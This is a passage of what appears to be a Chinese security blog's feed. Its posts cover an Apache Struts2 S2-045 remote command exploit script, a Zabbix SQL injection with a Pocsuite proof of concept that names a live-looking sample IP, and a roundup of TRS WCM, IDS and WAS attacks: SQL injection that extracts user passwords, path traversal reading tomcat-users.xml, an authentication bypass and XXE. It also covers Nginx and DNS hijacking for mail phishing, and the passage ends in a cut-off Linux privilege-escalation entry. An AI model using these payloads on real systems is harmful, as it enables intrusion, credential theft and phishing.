urllib2.urlopen(request).read()</span><br><span class="line">    <span class="keyword">except</span> httplib.IncompleteRead, e:</span><br><span class="line">        page = e.partial</span><br><span class="line">    print(page)</span><br><span class="line">    <span class="keyword">return</span> page</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">"[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] CVE: 2017-5638 - Apache Struts2 S2-045'</span>)</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">        print(<span class="string">"[*] cmd: %s\n"</span> % cmd)</span><br><span class="line">        exploit(url, cmd)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品：Struts1和Struts2，ApacheStruts 2.3.5–2.3.31版本及2.5–2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Zabbix注入漏洞</title>
    <link href="http://reboot.cf/2017/08/26/Zabbix%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://reboot.cf/2017/08/26/Zabbix注入漏洞/</id>
    <published>2017-08-26T06:42:48.000Z</published>
    <updated>2018-01-19T01:56:16.211Z</updated>
    
    <content type="html"><![CDATA[<p>Zabbix 是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。<br><a id="more"></a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Zabbix的<code>jsrpc</code>的<code>profileIdx2</code>参数存在<code>insert</code>方式的SQL注入漏洞，攻击者无需授权登陆即可登陆Zabbix管理系统，也可通过<code>script</code>等功能轻易直接获取Zabbix服务器的操作系统权限。但是无需登录注入这里有个前提，就是Zabbix开启了<code>guest</code>权限。而在Zabbix中，<code>guest</code>的默认密码为空，需要有这个条件的支持才可以进行无权限注入</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zabbix/jsrpc.php?<span class="built_in">type</span>=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=<span class="literal">true</span>&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17</span><br></pre></td></tr></table></figure><h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><p>代码基于<code>Pocsuite</code>框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.api.request <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.api.poc <span class="keyword">import</span> register</span><br><span class="line"><span class="keyword">from</span> pocsuite.api.poc <span class="keyword">import</span> Output, POCBase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'00004'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = <span class="string">'jeffzhang'</span></span><br><span class="line">    vulDate = <span class="string">'2017-08-26'</span></span><br><span class="line">    createDate = <span class="string">'2017-08-26'</span></span><br><span class="line">    updateDate = <span class="string">'2017-08-26'</span></span><br><span class="line">    references = [<span class="string">'http://www.freebuf.com/vuls/112197.html'</span>]</span><br><span class="line">    name = <span class="string">'Zabbix SQl 注入漏洞 PoC'</span></span><br><span class="line">    appPowerLink = <span class="string">'https://www.zabbix.com'</span></span><br><span class="line">    appName = <span class="string">'Zabbix'</span></span><br><span class="line">    appVersion = <span class="string">'3.0.3'</span></span><br><span class="line">    vulType = <span class="string">'SQL Injection'</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">    Zabbix 2.2.x和3.0.x版本中存在两处基于错误回显的SQL注入漏洞</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    samples = [<span class="string">'http://89.239.138.140:5001/'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payload = payload = <span class="string">"/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">        att_url = self.url + payload</span><br><span class="line">        response = req.get(att_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You have an error in your SQL syntax"</span> <span class="keyword">in</span> response.content:</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>] = &#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'Payload'</span>] = payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_attack</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'Internet noting return'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Zabbix 是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。&lt;br&gt;
    
    </summary>
    
    
      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
    
      <category term="SQL Injection" scheme="http://reboot.cf/tags/SQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>TRS漏洞整理</title>
    <link href="http://reboot.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <id>http://reboot.cf/2017/06/22/TRS漏洞整理/</id>
    <published>2017-06-22T09:43:55.000Z</published>
    <updated>2018-01-19T01:56:08.175Z</updated>
    
    <content type="html"><![CDATA[<p>TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下<br><a id="more"></a></p><h1 id="WCM内容管理系统"><a href="#WCM内容管理系统" class="headerlink" title="WCM内容管理系统"></a>WCM内容管理系统</h1><h2 id="WCM5-2-WCM6-5存在SQL注入"><a href="#WCM5-2-WCM6-5存在SQL注入" class="headerlink" title="WCM5.2~WCM6.5存在SQL注入"></a>WCM5.2~WCM6.5存在SQL注入</h2><p>首先是这个页面，<a href="http://xx.xx.xx/portal/db/dbupdatelog_list.jsp" target="_blank" rel="noopener">http://xx.xx.xx/portal/db/dbupdatelog_list.jsp</a><br>直接注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/<span class="built_in">set</span>/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/<span class="built_in">where</span>/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOG</span><br><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;/**/update/**/WCMDBUPDATELOG/**/<span class="built_in">set</span>/**/LogTitle=%28select/**/top/**/1/**/UserName%2bPassWord/**/from/**/WCMUSER%29/**/<span class="built_in">where</span>/**/1=1--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=15&amp;SearchTable=WCMDBUPDATELOG</span><br></pre></td></tr></table></figure><p>注：存在注入参数为:<code>OrderType</code>和<code>OrderField</code></p><h2 id="WCM任意文件下载漏洞"><a href="#WCM任意文件下载漏洞" class="headerlink" title="WCM任意文件下载漏洞"></a>WCM任意文件下载漏洞</h2><p>漏洞存在于<code>wcm/app/system/read_image.jsp</code>读取上传图片功能处，可构造链接下载任意文件，列如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure><p>读取<code>tomcat</code>配置文件</p><h2 id="WCM6-x系列用户密码泄漏"><a href="#WCM6-x系列用户密码泄漏" class="headerlink" title="WCM6.x系列用户密码泄漏"></a>WCM6.x系列用户密码泄漏</h2><p>TRS WCM 6.0以上版本某个功能页面调用<code>service</code>限制不严格，可以获取后台管理用户的用户名和密码序列。<br>访问链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://xx.xx.xx/wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getOnlineUsers</span><br></pre></td></tr></table></figure><p>WCM的密码加密方式是：常规<code>32</code>位<code>MD5</code>取前<code>15</code>位;<br>如果只访问<code>wcm/infoview.do</code>，尽管是个错误页面，比如：<br>首先访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/wcm/infoview.do</span><br></pre></td></tr></table></figure><p>然后你再访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/wcm</span><br></pre></td></tr></table></figure><h2 id="WCM用户注册逻辑漏洞"><a href="#WCM用户注册逻辑漏洞" class="headerlink" title="WCM用户注册逻辑漏洞"></a>WCM用户注册逻辑漏洞</h2><p>问题出在<code>wcm/console/auth/reg_newuser.jsp</code>文件中<br>即将随意表单改成<code>STATUS</code>值为<code>30</code>，或增加<code>STATUS</code>字段表单。<br>然后提交注册<br>虽然说是“请等待开通！”，但实际上已经开通了，因为<code>STATUS</code>字段已经改成正常了。<br>直接登陆<br>虽然没什么权限，但后台存在大量注入等漏洞<br>可以通过注入直接操作数据库了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx</span><br></pre></td></tr></table></figure><h2 id="WCM6权限绕过"><a href="#WCM6权限绕过" class="headerlink" title="WCM6权限绕过"></a>WCM6权限绕过</h2><p>首先访问wcm目录，会自动跳转到登录页面<br>在网址后加上查看管理员密码的链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getUsersByNames&amp;UserNames=admin</span><br></pre></td></tr></table></figure><p>之前的漏洞说查看管理员信息的危害不大是因为<code>MD5</code>加密只取半截，并且即使破解还有可能遇到<code>admin</code>账号未启用的问题<br>这时我们点击浏览器的后退按钮或在地址栏的网址后面直接输入<code>wcm/app/login.jsp</code>，这样就绕过权限登录了</p><h2 id="WCM全版本任意文件写入漏洞"><a href="#WCM全版本任意文件写入漏洞" class="headerlink" title="WCM全版本任意文件写入漏洞"></a>WCM全版本任意文件写入漏洞</h2><p>这个是16年年初出的漏洞，当初协助北京公司做过一次排查。<br>是利用<code>webservices</code>的<code>importDocuments</code>接口匿名访问，加上畸形文件名进行利用，<a href="/">Exp下载</a></p><h1 id="IDS身份管理系统"><a href="#IDS身份管理系统" class="headerlink" title="IDS身份管理系统"></a>IDS身份管理系统</h1><h2 id="IDS系统任意文件读取和信息泄露漏洞"><a href="#IDS系统任意文件读取和信息泄露漏洞" class="headerlink" title="IDS系统任意文件读取和信息泄露漏洞"></a>IDS系统任意文件读取和信息泄露漏洞</h2><p>漏洞文件路径在<code>admin/debug/</code>目录下，读取文件为<code>fv.jsp</code>，信息泄露为<code>env.jsp</code>等，直接访问文件即可</p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>使用<code>DNS Log</code>进行记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /ids/service?idsServiceType=jitSyncUser HTTP/1.1</span><br><span class="line">Host: **.**.**.**</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**</span><br><span class="line">X-Forwarded-For: **.**.**.**</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------1988224119974</span><br><span class="line">Content-Length: 196</span><br><span class="line">]&gt;&amp;xxe;</span><br></pre></td></tr></table></figure><p><a href="https://www.secpulse.com/archives/49564.html" target="_blank" rel="noopener">参考资料</a></p><h1 id="WAS文本检索系统"><a href="#WAS文本检索系统" class="headerlink" title="WAS文本检索系统"></a>WAS文本检索系统</h1><h2 id="WAS未授权访问"><a href="#WAS未授权访问" class="headerlink" title="WAS未授权访问"></a>WAS未授权访问</h2><p>安装目录下<code>was40/tree</code>文件可以看到一些后台功能<br>访问<code>was40/passwd/passwd.htm</code>输入一个不存在的用户名会暴露出服务器内网IP地址 同时存在暴力破解用户密码的可能性</p><h2 id="未授权发布信息"><a href="#未授权发布信息" class="headerlink" title="未授权发布信息"></a>未授权发布信息</h2><p>编辑信息的时候未对提交的数据进行过滤，同时存在未对用户是否登录进行验证</p><h1 id="WAS任意文件读取"><a href="#WAS任意文件读取" class="headerlink" title="WAS任意文件读取"></a>WAS任意文件读取</h1><p>问题出在<code>/was5/web/tree</code>文件下，构造路径可以任意读取文件，这个就创宇提的那个漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties</span><br></pre></td></tr></table></figure><h1 id="WAS任意文件下载漏洞"><a href="#WAS任意文件下载漏洞" class="headerlink" title="WAS任意文件下载漏洞"></a>WAS任意文件下载漏洞</h1><p>问题出在<code>was5/admin/template/download_templet.jsp</code>文件下，构造<code>type</code>参数的值可以任意下载文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx/was5/admin/template/download_templet.jsp?<span class="built_in">type</span>=../web/tagscloud</span><br></pre></td></tr></table></figure><h1 id="WAS任意文件写入"><a href="#WAS任意文件写入" class="headerlink" title="WAS任意文件写入"></a>WAS任意文件写入</h1><p>漏洞文件是<code>was5/admin/template/customize/detailcustomize</code>,构造<code>template</code>的参数值进行任意文件写入<br>同理还有一个问题文件<code>/was5/admin/template/customize/outlinecustomize</code>，利用方式一样</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下&lt;br&gt;
    
    </summary>
    
    
      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
    
  </entry>
  
  <entry>
    <title>Nginx配和DNS劫持钓鱼</title>
    <link href="http://reboot.cf/2017/03/24/Nginx%E9%85%8D%E5%92%8CDNS%E5%8A%AB%E6%8C%81%E9%92%93%E9%B1%BC/"/>
    <id>http://reboot.cf/2017/03/24/Nginx配和DNS劫持钓鱼/</id>
    <published>2017-03-24T09:58:17.000Z</published>
    <updated>2018-01-19T01:56:27.411Z</updated>
    
    <content type="html"><![CDATA[<p>最近有个项目用到Nginx服务器，用了一段时间发现Nginx的反向代理功能配合DNS劫持有奇效，记录一下过程跟一些技巧<br><a id="more"></a></p><h1 id="Nginx搭建"><a href="#Nginx搭建" class="headerlink" title="Nginx搭建"></a>Nginx搭建</h1><p>搭建Nginx我用的OpenResty，OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，内部集成了很多好用的 Lua 库、第三方模块以及大多数的依赖项。</p><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>官网下载最新源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://openresty.org/download/openresty-1.11.2.3.tar.gz</span><br></pre></td></tr></table></figure><p>还有个第三方的库<code>ngx_http_substitutions_filter_module</code>这个就是我们用来替换字符的后面会用到</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Ubuntu需要一些开发库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libreadline-dev libncurses5-dev libpcre3-dev libssl-dev perl make build-essential</span><br></pre></td></tr></table></figure><p>然后开始编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf openresty-VERSION.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openresty-VERSION/</span><br><span class="line">./configure --with-http_ssl_module//这里可以加一些参数，比如--prefix=/opt/openresty指定安装目录，--add-module添加第三方模块等，可以./configure --<span class="built_in">help</span> 查看更多的选项</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="启动及关闭"><a href="#启动及关闭" class="headerlink" title="启动及关闭"></a>启动及关闭</h2><p>先建立一个快捷方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx /usr/<span class="built_in">local</span>/bin/nginx</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -s stop</span><br><span class="line">or pkill nginx</span><br></pre></td></tr></table></figure><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><h1 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h1><p>Nginx配置文件主要分成四部分：<code>main</code>（全局设置）、<code>server</code>（主机设置）、<code>upstream</code>（上游服务器设置，主要为反向代理、负载均衡相关配置）和 <code>location</code>（URL匹配特定位置后的设置），每部分包含若干个指令。</p><ul><li>main部分设置的指令将影响其它所有部分的设置；</li><li>server部分的指令主要用于指定虚拟主机域名、IP和端口；</li><li>upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；</li><li>location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。</li></ul><p>他们之间的关系式：<code>server</code>继承<code>main</code>，<code>location</code>继承<code>server</code>；<code>upstream</code>既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。</p><h1 id="邮箱劫持配置"><a href="#邮箱劫持配置" class="headerlink" title="邮箱劫持配置"></a>邮箱劫持配置</h1><p>邮箱劫持的话呢要用到Nginx的反向代理了，关于Nginx配置文件介绍很多，就不摘了直接上配置文件了<br>Nginx主配置文件在<code>/usr/local/openresty/nginx/conf/nginx.conf</code>不过我习惯在<code>conf</code>目录下面建立文件夹把<code>server</code>主机配置单独放置，然后在<code>nginx.conf</code>主配置文件里<code>include</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近有个项目用到Nginx服务器，用了一段时间发现Nginx的反向代理功能配合DNS劫持有奇效，记录一下过程跟一些技巧&lt;br&gt;
    
    </summary>
    
    
      <category term="Nginx" scheme="http://reboot.cf/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>ProcessOn在线作图</title>
    <link href="http://reboot.cf/2016/09/30/ProcessOn%E5%9C%A8%E7%BA%BF%E4%BD%9C%E5%9B%BE/"/>
    <id>http://reboot.cf/2016/09/30/ProcessOn在线作图/</id>
    <published>2016-09-30T09:54:47.000Z</published>
    <updated>2018-01-19T01:56:25.879Z</updated>
    
    <content type="html"><![CDATA[<p>ProcessOn是一个方便易用、免费高效的在线作图工具，运用它可以免费制作多种图，例如：Flowchart流程图，BPMN图，Org组织结构图，EVC企业价值链图，EPC事件过程链图，网络拓扑图等<br><a id="more"></a><br><a href="https://www.processon.com/" target="_blank" rel="noopener">网址</a></p><p><img src="/images/processon-1.png" alt=""></p><p>账号：jeffzhang@yopmail.com<br>密码：</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ProcessOn是一个方便易用、免费高效的在线作图工具，运用它可以免费制作多种图，例如：Flowchart流程图，BPMN图，Org组织结构图，EVC企业价值链图，EPC事件过程链图，网络拓扑图等&lt;br&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="http://reboot.cf/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权漏洞整合</title>
    <link href="http://reboot.cf/2016/09/23/Linux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%95%B4%E5%90%88/"/>
    <id>http://reboot.cf/2016/09/23/Linux提权漏洞整合/</id>
    <published>2016-09-23T09:41:23.000Z</published>
    <updated>2018-01-19T01:55:55.522Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些经常用到的Linux提权漏洞<br><a id="more"></a></p><h1 id="Linux内核竞争条件漏洞（CVE-2016-8655）"><a href="#Linux内核竞争条件漏洞（CVE-2016-8655）" class="headerlink" title="Linux内核竞争条件漏洞（CVE-2016-8655）"></a>Linux内核竞争条件漏洞（CVE-2016-8655）</h1><p><a href="">代码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span 